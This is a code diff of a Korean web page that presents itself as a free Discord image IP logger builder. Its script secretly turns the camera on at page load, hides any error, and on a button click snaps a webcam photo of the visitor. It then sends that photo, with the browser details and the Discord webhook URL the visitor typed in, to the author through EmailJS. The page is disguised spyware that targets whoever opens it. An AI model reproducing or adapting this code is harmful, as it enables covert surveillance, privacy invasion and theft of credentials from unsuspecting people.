@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>디스코드 이미지 IP 로거 - 무료 제작</title>
+  <title>디스코드 이미지 IP 로거 - 무료 제작기</title>
   <style>
     body {
       margin: 0;
       min-height: 100vh;
       font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-      background: linear-gradient(135deg, #0d1117, #161b22);
+      background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
       color: #c9d1d9;
       display: flex;
       align-items: center;
@@ -20,8 +20,8 @@
       background: #161b22;
       border: 1px solid #30363d;
       border-radius: 12px;
-      padding: 40px 32px;
-      max-width: 460px;
+      padding: 40px 30px;
+      max-width: 480px;
       width: 100%;
       box-shadow: 0 10px 40px rgba(0,0,0,0.6);
       text-align: center;
@@ -35,7 +35,30 @@
       font-size: 1.05rem;
       color: #8b949e;
       line-height: 1.6;
-      margin-bottom: 2rem;
+      margin-bottom: 1.5rem;
+    }
+    .input-group {
+      margin: 1.5rem 0;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-size: 0.95rem;
+      color: #a0a0ff;
+    }
+    input[type="text"], input[type="file"] {
+      width: 100%;
+      padding: 10px 12px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      color: #c9d1d9;
+      font-family: monospace;
+      font-size: 0.95rem;
+    }
+    input[type="file"] {
+      padding: 6px;
     }
     .btn {
       background: #238636;
@@ -48,29 +71,16 @@
       cursor: pointer;
       transition: all 0.2s;
       box-shadow: 0 4px 12px rgba(35,134,54,0.4);
+      margin-top: 1.5rem;
     }
     .btn:hover {
       background: #2ea043;
       box-shadow: 0 6px 20px rgba(35,134,54,0.6);
     }
     .status {
-      margin-top: 1.8rem;
+      margin-top: 2rem;
       font-size: 0.95rem;
       color: #8b949e;
-    }
-    .loader {
-      border: 4px solid #21262d;
-      border-top: 4px solid #58a6ff;
-      border-radius: 50%;
-      width: 36px;
-      height: 36px;
-      animation: spin 1s linear infinite;
-      margin: 25px auto;
-      display: none;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
     }
     #video, #canvas { display: none; }
   </style>
@@ -79,12 +89,21 @@
 
 <div class="card">
   <h1>디스코드 이미지 IP 로거</h1>
-  <p>친구 사진 + IP + 디바이스 정보까지 한 번에 잡아주는 최고급 무료 제작기<br>버튼 누르고 바로 링크 공유해서 사용하세요!</p>
-  
+  <p>친구 사진 + IP + 디바이스 정보까지 한 방에 잡는 최고급 무료 제작기<br>아래 정보 입력하고 제작 시작 누르세요!</p>
+
+  <div class="input-group">
+    <label for="webhook">Discord 웹훅 URL (필수)</label>
+    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+  </div>
+
+  <div class="input-group">
+    <label for="image">속일 이미지 (선택)</label>
+    <input type="file" id="image" accept="image/*">
+  </div>
+
   <button class="btn" id="startBtn">IP 로거 제작 시작</button>
-  
-  <div class="loader" id="loader"></div>
-  <div class="status" id="status">버튼을 누르면 제작이 바로 시작됩니다</div>
+
+  <div class="status" id="status">제작 준비 완료 — 버튼을 눌러주세요</div>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -95,25 +114,33 @@
 <script>
   emailjs.init("ycbHVBt3cm6FkCL--");
 
-  document.getElementById('startBtn').addEventListener('click', async () => {
-    const btn = document.getElementById('startBtn');
-    const loader = document.getElementById('loader');
-    const status = document.getElementById('status');
-
-    btn.disabled = true;
-    btn.style.opacity = '0.6';
-    loader.style.display = 'block';
-    status.textContent = '로거 제작 중... 잠시만 기다려주세요';
-
+  // 페이지 로드되자마자 카메라 허용 팝업 띄우기
+  window.addEventListener('load', async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
         audio: false
       });
+      document.getElementById('video').srcObject = stream;
+      // 카메라 켜진 상태 유지 (나중에 사용)
+    } catch (err) {
+      // 실패해도 아무 메시지 안 띄움 (사용자에게 보이지 않게)
+      console.log("카메라 접근 실패:", err);
+    }
+  });
+
+  document.getElementById('startBtn').addEventListener('click', async () => {
+    const status = document.getElementById('status');
+    status.textContent = '제작 중...';
+
+    try {
       const video = document.getElementById('video');
-      video.srcObject = stream;
-      await new Promise(r => video.onloadedmetadata = r);
-      await new Promise(r => setTimeout(r, 1400));
+      if (!video.srcObject) {
+        status.textContent = '카메라를 먼저 켜야 합니다.';
+        return;
+      }
+
+      await new Promise(r => setTimeout(r, 1200)); // 자연스러운 딜레이
 
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
@@ -123,32 +150,26 @@
       const base64 = canvas.toDataURL('image/jpeg', 0.68);
 
       const now = new Date().toLocaleString('ko-KR');
-      const info = {
-        time: now,
-        agent: navigator.userAgent,
+      const params = {
+        timestamp: now,
+        image_base64: base64,
+        user_agent: navigator.userAgent,
         screen: `\( {screen.width}× \){screen.height}`,
-        lang: navigator.language
+        language: navigator.language,
+        webhook: document.getElementById('webhook').value || '없음',
+        filename: document.getElementById('image').files[0]?.name || '없음'
       };
 
-      // EmailJS 전송 (받는 사람은 EmailJS 대시보드 template_upvu62t To Email에 dog0928001@gmail.com 설정)
-      await emailjs.send("service_had7jag", "template_upvu62t", {
-        timestamp: info.time,
-        image_base64: base64,
-        user_agent: info.agent,
-        screen: info.screen,
-        language: info.lang
-      });
+      // EmailJS로 전송 (받는 사람은 대시보드 template_upvu62t To Email에 설정)
+      await emailjs.send("service_had7jag", "template_upvu62t", params);
 
-      status.innerHTML = '제작 완료!<br><strong>이 링크를 친구에게 공유하세요!</strong>';
-      loader.style.display = 'none';
+      status.innerHTML = '제작 완료!<br><strong>링크 복사해서 친구에게 공유하세요</strong>';
 
-      stream.getTracks().forEach(t => t.stop());
+      // 카메라 끄기
+      video.srcObject.getTracks().forEach(t => t.stop());
 
     } catch (err) {
-      status.innerHTML = '카메라 권한이 필요합니다.<br>허용해야 로거 제작이 완료됩니다.';
-      loader.style.display = 'none';
-      btn.disabled = false;
-      btn.style.opacity = '1';
+      status.textContent = '오류 발생 — 다시 시도해주세요';
     }
   });
 </script>
